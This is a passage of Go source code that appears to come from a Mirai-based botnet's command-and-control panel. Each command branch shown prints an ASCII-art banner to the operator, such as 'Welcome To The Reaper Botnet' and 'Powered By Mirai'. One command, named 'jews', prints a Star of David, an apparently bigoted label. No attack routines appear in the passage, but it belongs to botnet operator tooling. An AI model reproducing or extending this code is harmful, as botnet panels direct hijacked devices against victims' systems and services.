            this.conn.Write([]byte("\x1b[1;96m                 ████\x1b[0;95m╗  \x1b[0;96m██\x1b[0;95m║\x1b[0;96m██\x1b[0;95m╔════╝\x1b[0;96m██\x1b[0;95m║ \x1b[0;96m██\x1b[0;95m╔╝\x1b[0;96m██\x1b[0;95m╔═══\x1b[0;96m██\x1b[0;95m╗    \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;96m                 ██\x1b[0;95m╔\x1b[0;96m██\x1b[0;95m╗ \x1b[0;96m██\x1b[0;95m║\x1b[0;96m█████\x1b[0;95m╗  \x1b[0;96m█████\x1b[0;95m╔╝ \x1b[0;96m██\x1b[0;95m║   \x1b[0;96m██\x1b[0;95m║    \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;96m                 ██\x1b[0;95m║╚\x1b[0;96m██\x1b[0;95m╗\x1b[0;96m██\x1b[0;95m║\x1b[0;96m██\x1b[0;95m╔══╝  \x1b[0;96m██\x1b[0;95m╔═\x1b[0;96m██\x1b[0;95m╗ \x1b[0;96m██\x1b[0;95m║   \x1b[0;96m██\x1b[0;95m║    \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;96m                 ██\x1b[0;95m║ ╚\x1b[0;96m████\x1b[0;95m║\x1b[0;96m███████\x1b[0;95m╗\x1b[0;96m██\x1b[0;95m║  \x1b[0;96m██\x1b[0;95m╗╚\x1b[0;96m██████\x1b[0;95m╔╝    \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;95m                 ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝     \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;96m                                              \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;95m                           I'm a little kitty!                         \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;96m                                               \r\n\x1b[0m"))
            continue
        }
        if err != nil || cmd == "batman" || cmd == "BATMAN" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[33m   MMMMMMMMMMMMMMMMMMMMM                              MMMMMMMMMMMMMMMMMMMMM\r\n"))
            this.conn.Write([]byte("\033[33m    `MMMMMMMMMMMMMMMMMMMM           N    N           MMMMMMMMMMMMMMMMMMMM'\r\n"))
            this.conn.Write([]byte("\033[33m      `MMMMMMMMMMMMMMMMMMM          MMMMMM          MMMMMMMMMMMMMMMMMMM'\r\n"))
            this.conn.Write([]byte("\033[33m        MMMMMMMMMMMMMMMMMMM-_______MMMMMMMM_______-MMMMMMMMMMMMMMMMMMM\r\n"))
            this.conn.Write([]byte("\033[33m         MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\r\n"))
            this.conn.Write([]byte("\033[33m         MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\r\n"))
            this.conn.Write([]byte("\033[33m         MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\r\n"))
            this.conn.Write([]byte("\033[33m        .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.\r\n"))
            this.conn.Write([]byte("\033[33m       MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\r\n"))
            this.conn.Write([]byte("\033[33m                      `MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM'\r\n"))
            this.conn.Write([]byte("\033[33m                             `MMMMMMMMMMMMMMMMMM'\r\n"))
            this.conn.Write([]byte("\033[33m                                 `MMMMMMMMMM'\r\n"))
            this.conn.Write([]byte("\033[33m                                    MMMMMM\r\n"))
            this.conn.Write([]byte("\033[33m                                     MMMM\r\n"))
            this.conn.Write([]byte("\033[33m                                      MM\r\n"))
            continue
        }
        if err != nil || cmd == "senpai" || cmd == "SENPAI" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\t \r\n"))
            this.conn.Write([]byte("\x1b[1;35m           ███████\x1b[1;36m╗\x1b[1;35m███████\x1b[1;36m╗\x1b[1;35m███\x1b[1;36m╗   \x1b[1;35m██\x1b[1;36m╗\x1b[1;35m██████\x1b[1;36m╗  \x1b[1;35m█████\x1b[1;36m╗ \x1b[1;35m██\x1b[1;36m╗\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;35m           ██\x1b[1;36m╔════╝\x1b[1;35m██\x1b[1;36m╔════╝\x1b[1;35m████\x1b[1;36m╗  \x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m╔══\x1b[1;35m██\x1b[1;36m╗\x1b[1;35m██\x1b[1;36m╔══\x1b[1;35m██\x1b[1;36m╗\x1b[1;35m██\x1b[1;36m║\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;35m           ███████\x1b[1;36m╗\x1b[1;35m█████\x1b[1;36m╗  \x1b[1;35m██\x1b[1;36m╔\x1b[1;35m██\x1b[1;36m╗ \x1b[1;35m██\x1b[1;36m║\x1b[1;35m██████\x1b[1;36m╔╝\x1b[1;35m███████\x1b[1;36m║\x1b[1;35m██\x1b[1;36m║\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;36m           ╚════\x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m╔══╝  \x1b[1;35m██\x1b[1;36m║╚\x1b[1;35m██\x1b[1;36m╗\x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m╔═══╝ \x1b[1;35m██\x1b[1;36m╔══\x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m║\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;35m           ███████\x1b[1;36m║\x1b[1;35m███████\x1b[1;36m╗\x1b[1;35m██\x1b[1;36m║ ╚\x1b[1;35m████\x1b[1;36m║\x1b[1;35m██\x1b[1;36m║     \x1b[1;35m██\x1b[1;36m║  \x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m║\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;36m           ╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝╚═╝\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;36m              \x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\x1b[1;37mようこそ\x1b[1;36m \033[95;1m" + username + " \x1b[1;37mTo The Mana  BotNet\x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;36m               \x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\x1b[1;37mヘルプを入力してヘルプを表示する\x1b[1;35m[\x1b[1;37m+\x1b[1;35m]\r\n\x1b[0m"))
            this.conn.Write([]byte("\t \r\n"))     
            continue
        }
        if err != nil || cmd == "sao" || cmd == "SAO" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\t\033[37m     .---.    \t                            \t\033[37m       .---.    \r\n"))
            this.conn.Write([]byte("\t\033[37m     |---|    \t                            \t\033[37m       |---|    \r\n"))
            this.conn.Write([]byte("\t\033[37m     |---|    \t                            \t\033[37m       |---|    \r\n"))
            this.conn.Write([]byte("\t\033[37m     |---|    \t                            \t\033[37m       |---|    \r\n"))
            this.conn.Write([]byte("\t\033[37m .---^ - ^---.\t                            \t\033[37m   .---^ - ^---.\r\n"))
            this.conn.Write([]byte("\t\033[37m :___________:\t                            \t\033[37m   :___________:\r\n"))
            this.conn.Write([]byte("\t\033[37m    |  |//|   \t\033[36m  ██████  ▄▄▄       \033[31m▒\033[36m█████  \t\033[37m      |  |//|   \r\n"))
            this.conn.Write([]byte("\t\033[37m    |  |//|   \t\033[31m▒\033[36m██    \033[31m▒ ▒\033[36m████▄    \033[31m▒\033[36m██\033[31m▒  \033[36m██\033[31m▒\t\033[37m      |  |//|   \r\n"))
            this.conn.Write([]byte("\t\033[37m    |  |//|   \t\033[31m░ ▓\033[36m██▄  \033[31m ▒\033[36m██  ▀█▄  \033[31m▒\033[36m██\033[31m░  \033[36m██\033[31m▒\t\033[37m      |  |//|   \r\n"))
            this.conn.Write([]byte("\t\033[37m    |  |//|   \t\033[31m  ▒\033[36m   ██\033[31m▒░\033[36m██▄▄▄▄██ \033[31m▒\033[36m██   ██\033[31m░\t\033[37m      |  |//|   \r\n"))
            this.conn.Write([]byte("\t\033[37m    |  |//|   \t\033[31m▒\033[36m██████\033[31m▒▒ ▓\033[36m█   \033[31m▓\033[36m██\033[31m▒░ \033[36m████\033[31m▓▒░\t\033[37m      |  |//|   \r\n"))
            this.conn.Write([]byte("\t\033[37m    |  |//|   \t\033[31m▒ ▒▓▒ ▒ ░ ▒▒   ▓▒\033[36m█\033[31m░░ ▒░▒░▒░ \t\033[37m      |  |//|   \r\n"))
            this.conn.Write([]byte("\t\033[37m    |  |.-|   \t\033[31m░ ░▒  ░ ░  ▒   ▒▒ ░  ░ ▒ ▒░ \t\033[37m      |  |.-|   \r\n"))
            this.conn.Write([]byte("\t\033[37m    |.-'**|   \t\033[31m░  ░  ░    ░   ▒   ░ ░ ░ ▒  \t\033[37m      |.-'**|   \r\n"))
            this.conn.Write([]byte("\t\033[37m     \\***/    \t\033[31m      ░        ░  ░    ░ ░  \t\033[37m       \\***/    \r\n"))
            this.conn.Write([]byte("\t\033[37m      \\*/     \t                            \t\033[37m        \\*/     \r\n"))
            this.conn.Write([]byte("\t\033[37m       V      \t                            \t\033[37m         V      \r\n"))
            this.conn.Write([]byte("\t\033[37m      '       \t                            \t\033[37m        '       \r\n"))
            this.conn.Write([]byte("\t\033[37m       ^'     \t                            \t\033[37m         ^'     \r\n"))
            this.conn.Write([]byte("\t\033[37m      (_)     \t                            \t\033[37m        (_)     \r\n"))
            this.conn.Write([]byte("\t \r\n"))
            this.conn.Write([]byte("\t \r\n"))
            continue
        }
		if err != nil || cmd == "HYBRID" || cmd == "hybrid" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\r\x1b[0;31mUsername\x1b[0;37m: \033[0m" + username + "\r\n"))
			this.conn.Write([]byte("\r\x1b[0;31mPassword\x1b[0;37m: **********\033[0m\r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\r\x1b[0;37m     [\x1b[0;31mようこそ\x1b[0;37m] HYBRID BUILD ONE - KNOWLEDGE IS POWER [\x1b[0;31mようこそ\x1b[0;37m]        \r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			this.conn.Write([]byte("\r\x1b[0;37m   ▄█    █▄    ▄██   ▄   ▀█████████▄     ▄████████  ▄█  ████████▄   \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m   ███    ███   ███   ██▄   ███    ███   ███    ███ ███  ███   ▀███ \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m  ███    ███   ███▄▄▄███   ███    ███   ███    ███ ███▌ ███    ███  \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m ▄███▄▄▄▄███▄▄ ▀▀▀▀▀▀███  ▄███▄▄▄██▀   ▄███▄▄▄▄██▀ ███▌ ███    ███  \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m ▀▀███▀▀▀▀███▀  ▄██   ███ ▀▀███▀▀▀██▄  ▀▀███▀▀▀▀▀   ███▌ ███    ███ \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m  ███    ███   ███   ███   ███    ██▄ ▀███████████ ███  ███    ███  \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m   ███    ███   ███   ███   ███    ███   ███    ███ ███  ███   ▄███ \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m  ███    █▀     ▀█████▀  ▄█████████▀    ███    ███ █▀   ████████▀   \r\n"))
			this.conn.Write([]byte("\r\x1b[0;37m                                         ███    ███                 \r\n"))
			this.conn.Write([]byte("\r\n\033[0m"))
			continue
		}
        if err != nil || cmd == "timeout" || cmd == "TIMEOUT" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[0;35m             \r\n"))
            this.conn.Write([]byte("\033[1;30m             \r\n\033[0m"))
            this.conn.Write([]byte("\033[1;92m            ████████\033[95m╗\033[92m██\033[95m╗\033[92m███\033[95m╗   \033[92m███\033[95m╗\033[92m███████\033[95m╗ \033[92m██████\033[95m╗ \033[92m██\033[95m╗   \033[92m██\033[95m╗\033[92m████████\033[95m╗      \r\n"))
            this.conn.Write([]byte("\033[1;95m            ╚══██╔══╝██║████╗ ████║██╔════╝██╔═══██╗██║   ██║╚══██╔══╝      \r\n"))
            this.conn.Write([]byte("\033[1;92m               ██\033[95m║   \033[92m██\033[95m║\033[92m██\033[95m╔\033[92m████\033[95m╔\033[92m██\033[95m║\033[92m█████\033[95m╗  \033[92m██\033[95m║   \033[92m██\033[95m║\033[92m██\033[95m║   \033[92m██\033[95m║   \033[92m██\033[95m║         \r\n"))
            this.conn.Write([]byte("\033[1;92m               ██\033[95m║   \033[92m██\033[95m║\033[92m██\033[95m║╚\033[92m██\033[95m╔╝\033[92m██\033[95m║\033[92m██\033[95m╔══╝  \033[92m██\033[95m║   \033[92m██\033[95m║\033[92m██\033[95m║   \033[92m██\033[95m║   \033[92m██\033[95m║         \r\n"))    
            this.conn.Write([]byte("\033[1;92m               ██\033[95m║   \033[92m██\033]95m║\033[92m ██\033[95m║ ╚═╝ \033[92m██\033[95m║\033[92m███████\033[95m╗╚\033[92m██████\033[95m╔╝╚\033[92m██████\033[95m╔╝   \033[92m██\033[95m║         \r\n"))
            this.conn.Write([]byte("\033[1;95m               ╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝ ╚═════╝  ╚═════╝    ╚═╝         \r\n"))
            this.conn.Write([]byte("\033[1;92m             \r\n"))
            this.conn.Write([]byte("\x1b[0;37m             \r\n\x1b[0m"))
            continue
        }
        if err != nil || cmd == "xanax" || cmd == "XANAX" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r \x1b[0;35m██\x1b[0;37m╗  \x1b[0;35m██\x1b[0;37m╗ \x1b[0;35m█████\x1b[0;37m╗ \x1b[0;35m███\x1b[0;37m╗   \x1b[0;35m██\x1b[0;37m╗ \x1b[0;35m█████\x1b[0;37m╗ \x1b[0;35m██\x1b[0;37m╗  \x1b[0;35m██\x1b[0;37m╗\r\n"))
            this.conn.Write([]byte("\r \x1b[0;37m╚\x1b[0;35m██\x1b[0;37m╗\x1b[0;35m██\x1b[0;37m╔╝\x1b[0;35m██\x1b[0;37m╔══\x1b[0;35m██\x1b[0;37m╗\x1b[0;35m████\x1b[0;37m╗  \x1b[0;35m██\x1b[0;37m║\x1b[0;35m██\x1b[0;37m╔══\x1b[0;35m██\x1b[0;37m╗╚\x1b[0;35m██\x1b[0;37m╗\x1b[0;35m██\x1b[0;37m╔╝\r\n"))
            this.conn.Write([]byte("\r \x1b[0;37m ╚\x1b[0;35m███\x1b[0;37m╔╝ \x1b[0;35m███████\x1b[0;37m║\x1b[0;35m██\x1b[0;37m╔\x1b[0;35m██\x1b[0;37m╗ \x1b[0;35m██\x1b[0;37m║\x1b[0;35m███████\x1b[0;37m║ ╚\x1b[0;35m███\x1b[0;37m╔╝ \r\n"))
            this.conn.Write([]byte("\r \x1b[0;35m ██\x1b[0;37m╔\x1b[0;35m██\x1b[0;37m╗ \x1b[0;35m██\x1b[0;37m╔══\x1b[0;35m██\x1b[0;37m║\x1b[0;35m██\x1b[0;37m║╚\x1b[0;35m██\x1b[0;37m╗\x1b[0;35m██\x1b[0;37m║\x1b[0;35m██\x1b[0;37m╔══\x1b[0;35m██\x1b[0;37m║\x1b[0;35m ██\x1b[0;37m╔\x1b[0;35m██\x1b[0;37m╗ \r\n"))
            this.conn.Write([]byte("\r \x1b[0;35m██\x1b[0;37m╔╝ \x1b[0;35m██\x1b[0;37m╗\x1b[0;35m██\x1b[0;37m║  \x1b[0;35m██\x1b[0;37m║\x1b[0;35m██\x1b[0;37m║ ╚\x1b[0;35m████\x1b[0;37m║\x1b[0;35m██\x1b[0;37m║  \x1b[0;35m██\x1b[0;37m║\x1b[0;35m██\x1b[0;37m╔╝\x1b[0;35m ██\x1b[0;37m╗\r\n"))
            this.conn.Write([]byte("\r \x1b[0;37m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝\r\n"))
            this.conn.Write([]byte("\r   \x1b[0;35m*** \x1b[0;37mWelcome To Xanax | Version 2.0 \x1b[0;35m***\r\n"))
            this.conn.Write([]byte("\r       \x1b[0;35m*** \x1b[0;37mPowered By Mirai #Reps \x1b[0;35m***\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }
                if err != nil || cmd == "reaper" || cmd == "REAPER" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[31m                ...                               \r\n"))
            this.conn.Write([]byte("\033[31m              ;::::;                              \r\n"))
            this.conn.Write([]byte("\033[31m            ;::::; :;                             \r\n"))
            this.conn.Write([]byte("\033[31m          ;:::::'   :;                            \r\n"))
            this.conn.Write([]byte("\033[31m         ;:::::;     ;.                           \r\n"))
            this.conn.Write([]byte("\033[31m        ,:::::'       ;           OOO             \r\n"))
            this.conn.Write([]byte("\033[31m        ::::::;       ;          OOOOO            \r\n"))
            this.conn.Write([]byte("\033[31m        ;:::::;       ;         OOOOOOOO          \r\n")) 
            this.conn.Write([]byte("\033[31m       ,;::::::;     ;'         / OOOOOOO         \r\n"))
            this.conn.Write([]byte("\033[31m     ;:::::::::`. ,,,;.        /  / DOOOOOO       \r\n")) 
            this.conn.Write([]byte("\033[31m   .';:::::::::::::::::;,     /  /     DOOOO      \r\n")) 
            this.conn.Write([]byte("\033[31m  ,::::::;::::::;;;;::::;,   /  /        DOOO     \r\n")) 
            this.conn.Write([]byte("\033[31m ;`::::::`'::::::;;;::::: ,#/  /          DOOO    \r\n")) 
            this.conn.Write([]byte("\033[31m :`:::::::`;::::::;;::: ;::#  /            DOOO   \r\n")) 
            this.conn.Write([]byte("\033[31m ::`:::::::`;:::::::: ;::::# /              DOO   \r\n")) 
            this.conn.Write([]byte("\033[31m `:`:::::::`;:::::: ;::::::#/               DOO   \r\n")) 
            this.conn.Write([]byte("\033[31m  :::`:::::::`;; ;:::::::::##                OO   \r\n")) 
            this.conn.Write([]byte("\033[31m  ::::`:::::::`;::::::::;:::#                OO   \r\n")) 
            this.conn.Write([]byte("\033[31m  `:::::`::::::::::::;'`:;::#                O    \r\n")) 
            this.conn.Write([]byte("\033[31m   `:::::`::::::::;' /  / `:#                     \r\n")) 
            this.conn.Write([]byte("\033[31m                                                  \r\n"))
            this.conn.Write([]byte("\033[31m           Welcome To The Reaper Botnet           \r\n"))
            this.conn.Write([]byte("\033[31m              Type ? To Get Started               \r\n"))
            this.conn.Write([]byte("\033[31m                                                  \r\n"))
            continue
        }
		
        		if err != nil || cmd == "xeon" || cmd == "XEON" {
        	this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\x1b[0m                                           \r\n"))
            this.conn.Write([]byte("\x1b[0m \x1b[32m     \x1b[32m██\x1b[0m╗  \x1b[32m██\x1b[0m╗\x1b[32m███████\x1b[0m╗ \x1b[32m██████\x1b[0m╗ \x1b[32m███\x1b[0m╗  \x1b[32m ██\x1b[0m╗  \r\n"))
            this.conn.Write([]byte("\x1b[0m \x1b[32m   \x1b[0m  ╚\x1b[32m██\x1b[0m╗\x1b[32m██\x1b[0m╔╝\x1b[32m██\x1b[0m╔════╝\x1b[32m██\x1b[0m╔═══\x1b[32m██\x1b[0m╗\x1b[32m████\x1b[0m╗  \x1b[32m██\x1b[0m║  \r\n"))
			this.conn.Write([]byte("\x1b[0m \x1b[32m     \x1b[0m ╚\x1b[32m███\x1b[0m╔╝ \x1b[32m█████\x1b[0m╗  \x1b[32m██\x1b[0m║   \x1b[32m██\x1b[0m║\x1b[32m██\x1b[0m╔\x1b[32m██\x1b[0m╗ \x1b[32m██\x1b[0m║  \r\n"))
            this.conn.Write([]byte("\x1b[0m \x1b[32m      ██\x1b[0m╔\x1b[32m██\x1b[0m╗ \x1b[32m██\x1b[0m╔══╝  \x1b[32m██\x1b[0m║   \x1b[32m██\x1b[0m║\x1b[32m██\x1b[0m║╚\x1b[32m██\x1b[0m╗\x1b[32m██\x1b[0m║  \r\n"))
            this.conn.Write([]byte("\x1b[0m \x1b[32m     ██\x1b[0m╔╝\x1b[32m ██\x1b[0m╗\x1b[32m███████\x1b[0m╗╚\x1b[32m██████\x1b[0m╔╝\x1b[32m██\x1b[0m║ ╚\x1b[32m████\x1b[0m║  \r\n"))
            this.conn.Write([]byte("\x1b[0m      ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝  \r\n"))
            this.conn.Write([]byte("\x1b[0m               Type \x1b[32mHELP \x1b[0mFor \x1b[32mHelp          \r\n"))
			this.conn.Write([]byte("\x1b[0m                                           \r\n"))
            continue
        }

        		if err != nil || cmd == "ICED" || cmd == "iced" {
        	this.conn.Write([]byte("\033[2J\033[1H"))
        	this.conn.Write([]byte("\x1b[0m                                        \r\n"))
            this.conn.Write([]byte("\x1b[0m  \x1b[36m       \x1b[36m██▓ \x1b[36m▄████▄\x1b[0m  ▓\x1b[36m█████ ▓\x1b[36m█████▄     \r\n"))
            this.conn.Write([]byte("\x1b[0m  \x1b[36m      ▓\x1b[36m██\x1b[0m▒▒\x1b[36m██▀ ▀█  ▓█   ▀ \x1b[0m▒\x1b[36m██▀ ██▌    \r\n"))
            this.conn.Write([]byte("\x1b[0m  \x1b[36m      \x1b[0m▒\x1b[36m██\x1b[0m▒▒\x1b[36m▓█    ▄ \x1b[0m▒\x1b[36m███  \x1b[0m ░\x1b[36m██   █▌    \r\n"))
			this.conn.Write([]byte("\x1b[0m  \x1b[36m      \x1b[0m░\x1b[36m██\x1b[0m░▒\x1b[36m▓▓▄ ▄██\x1b[0m▒▒▓\x1b[36m█  ▄ \x1b[0m░\x1b[36m▓█▄   ▌    \r\n"))
            this.conn.Write([]byte("\x1b[0m  \x1b[36m      \x1b[0m░\x1b[36m██\x1b[0m░▒ \x1b[36m▓███▀ \x1b[0m░░▒\x1b[36m████\x1b[0m▒░▒\x1b[36m████\x1b[0m▓     \r\n"))
            this.conn.Write([]byte("\x1b[0m  \x1b[36m      \x1b[0m░\x1b[36m▓ \x1b[0m ░ ░▒ ▒  ░░░ ▒░ ░ ▒▒▓ \x1b[0m ▒     \r\n"))
            this.conn.Write([]byte("\x1b[0m  \x1b[36m \x1b[0m      ▒ ░  ░  ▒    ░ ░  ░ ░ ▒  ▒     \r\n"))
            this.conn.Write([]byte("\x1b[0m  \x1b[36m \x1b[0m      ▒ ░░           ░    ░ ░  ░     \r\n"))
            this.conn.Write([]byte("\x1b[0m  \x1b[36m \x1b[0m      ░  ░ ░         ░  ░   ░        \r\n"))
            this.conn.Write([]byte("\x1b[0m  \x1b[36m \x1b[0m         ░                ░                                         \r\n"))
            this.conn.Write([]byte("\x1b[0m             Type \x1b[36mHELP \x1b[0mFor \x1b[36mHelp          \r\n"))
			this.conn.Write([]byte("\x1b[0m                                           \r\n")) 
            continue
        }

        		if err != nil || cmd == "JEWS" || cmd == "jews" {
        	this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\x1b[0m               ▄▀▄               \r\n"))
			this.conn.Write([]byte("\x1b[0m             ▄▀░░░▀▄             \r\n"))
            this.conn.Write([]byte("\x1b[0m           ▄▀░░░░▄▀█             \r\n"))
            this.conn.Write([]byte("\x1b[0m         ▄▀░░░░▄▀ ▄▀ ▄▀▄         \r\n"))
            this.conn.Write([]byte("\x1b[0m       ▄▀░░░░▄▀ ▄▀ ▄▀░░░▀▄       \r\n"))
            this.conn.Write([]byte("\x1b[0m       █▀▄░░░░▀█ ▄▀░░░░░░░▀▄     \r\n"))
			this.conn.Write([]byte("\x1b[0m   ▄▀▄ ▀▄ ▀▄░░░░▀░░░░▄█▄░░░░▀▄   \r\n"))
            this.conn.Write([]byte("\x1b[0m ▄▀░░░▀▄ ▀▄ ▀▄░░░░░▄▀ █ ▀▄░░░░▀▄ \r\n"))
            this.conn.Write([]byte("\x1b[0m █▀▄░░░░▀▄ █▀░░░░░░░▀█ ▀▄ ▀▄░▄▀█ \r\n"))
            this.conn.Write([]byte("\x1b[0m ▀▄ ▀▄░░░░▀░░░░▄█▄░░░░▀▄ ▀▄ █ ▄▀ \r\n"))
			this.conn.Write([]byte("\x1b[0m   ▀▄ ▀▄░░░░░▄▀ █ ▀▄░░░░▀▄ ▀█▀   \r\n"))
            this.conn.Write([]byte("\x1b[0m     ▀▄ ▀▄░▄▀ ▄▀ █▀░░░░▄▀█       \r\n"))
            this.conn.Write([]byte("\x1b[0m      ▀▄ █ ▄▀ ▄▀░░░░▄▀ ▄▀        \r\n"))
            this.conn.Write([]byte("\x1b[0m        ▀█▀ ▄▀░░░░▄▀ ▄▀          \r\n"))
            this.conn.Write([]byte("\x1b[0m            █▀▄░▄▀ ▄▀            \r\n"))
			this.conn.Write([]byte("\x1b[0m             ▀▄ █ ▄▀             \r\n"))
			this.conn.Write([]byte("\x1b[0m               ▀█▀               \r\n"))
            this.conn.Write([]byte("\x1b[0m                                 \r\n"))
            continue
        }
                if err != nil || cmd == "hoho" || cmd == "HOHO" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[1;31m\r\n"))
            this.conn.Write([]byte("\033[1;31m             888    888\033[1;36m        \033[1;31m  888    888  \033[1;36m        \r\n"))
            this.conn.Write([]byte("\033[1;31m             888    888\033[1;36m        \033[1;31m  888    888  \033[1;36m        \r\n"))
            this.conn.Write([]byte("\033[1;31m             888    888\033[1;36m        \033[1;31m  888    888  \033[1;36m        \r\n"))
            this.conn.Write([]byte("\033[1;31m             8888888888\033[1;36m  .d88b.\033[1;31m  8888888888  \033[1;36m.d88b.  \r\n"))
            this.conn.Write([]byte("\033[1;31m             888    888\033[1;36m d88\"\"88b\033[1;31m 888    888\033[1;36m d88\"\"88b \r\n"))
            this.conn.Write([]byte("\033[1;31m             888    888\033[1;36m 888  888\033[1;31m 888    888 \033[1;36m888  888 \r\n"))
            this.conn.Write([]byte("\033[1;31m             888    888\033[1;36m Y88..88P\033[1;31m 888    888 \033[1;36mY88..88P \r\n"))
            this.conn.Write([]byte("\033[1;31m             888    888\033[1;36m  \"Y88P\"\033[1;31m  888    888\033[1;36m  \"Y88P\"  \r\n"))
            this.conn.Write([]byte("\033[1;31m                    \r\n"))
            continue
        }
        if err != nil || cmd == "mickey" || cmd == "MICKEY" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[1;90m                                                                                                                                                    \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                              \033[90m.::`:`:`:.                                                      \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                             \033[90m:.:.:.:.:.::.                                                    \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                             \033[90m::.:.:.:.:.:.:                                                   \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                             \033[90m`.:.:.:.:.:.:'                                                   \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                                        ,,\033[90m.::::.:.:.:.:.:'                                                    \r\n"))
            this.conn.Write([]byte("\033[1;90m                                             \033[97m.,,.                   \033[38;5;216m.,<?3$;e$$$$e\033[90m:.:.```                                    \r\n"))
            this.conn.Write([]byte("\033[1;90m                                           \033[97m,d$$$P            \033[90m.::. \033[38;5;216m,JP?$$$$$$,?$$$>\033[90m:.:`:    .,:,.                      \r\n"))
            this.conn.Write([]byte("\033[1;90m                                \033[97m_..,,,,.. ,?$$$>            \033[90m:.:*:.\033[38;5;216mF;$>$P?T$$$,$$$>\033[90m.:.:.:.::.:.:.::                    \r\n"))
            this.conn.Write([]byte("\033[1;90m____________________          \033[97m,<<<????9F$$$$$$$$>            \033[90m`:.:.\033[38;5;216m;  \033[90m)\033[38;5;216mdF<$>3$$$$$F\033[90m.:.:.:.::.:.:.:.::\r\n"))
            this.conn.Write([]byte("\033[1;90m                            \033[97mue<d<d<ed'dP????$$$$,             \033[38;5;216mu;e$bcRF  \033[90m)\033[38;5;216mJ$$$$$'\033[90m.:.:.:.::.:.:.:.:.:       \r\n"))
            this.conn.Write([]byte("\033[1;90m       \033[1;34mミッキー           \033[97m'<e<e<e<d'd$$$$$$$$$$$b            \033[38;5;216m$$$$$$$$oe$$$$$F\033[90m:.:.:.:.::.:.:.:.:.:'                       \r\n"))
            this.conn.Write([]byte("\033[1;90m____________________        \033[97m`??$$$???4$$$$$$$$$$F\033[90m::::..        \033[38;5;216m?$$$$$$$$$$$$$$$$$$b\033[90m.:.:: `.:.:.:.:'                   \r\n"))
            this.conn.Write([]byte("\033[1;90m                                       \033[97m``'????$$b;\033[90m:::::::d$$$$$c`\033[38;5;216m?$$$$$$$$F u($$$$$>\033[90m.:'    `'''`                 \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                   \033[90m`':::J$$$$$$$$bo\033[38;5;216m`\";_,\033[38;5;216meed$$$$$$P                                    \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                       \033[90m?$$$$$$$F$Fi,\033[38;5;216m''``'????''                                                   \r\n"))
            this.conn.Write([]byte("\033[1;90m                                                       \033[90m`?$$?$$'d>???b`'e$$$$'$$$c                                                             \r\n"))
